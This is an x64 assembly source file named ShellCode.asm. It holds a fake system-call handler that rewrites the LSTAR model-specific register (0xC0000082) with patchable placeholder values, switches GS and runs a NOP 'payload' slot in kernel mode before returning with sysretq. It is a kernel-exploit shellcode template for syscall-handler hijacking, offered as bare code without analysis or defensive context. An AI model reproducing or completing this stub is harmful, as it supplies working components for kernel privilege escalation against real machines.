;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;	
;;;;;;;;;;;;;;;;;	ml64.exe  ShellCode.asm /c 
;;;;;;;;;;;;;;;;;

.code

FakeSystemCall64 PROC
    push	rcx					; %rcx-> %rip
    push	r11					; %r11-> %RFLAGS
	mov		eax, 090909090h		; LstarLow
	mov		edx, 090909090h		; LStarHigh
	mov		ecx, 0C0000082h		; LSTAR address
	wrmsr						; restore MSR [ LSTAR ]
	swapgs
payload:
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
payload_end:
	pop		r11
	pop		rcx
	swapgs
	sysretq
	
FakeSystemCall64 ENDP

END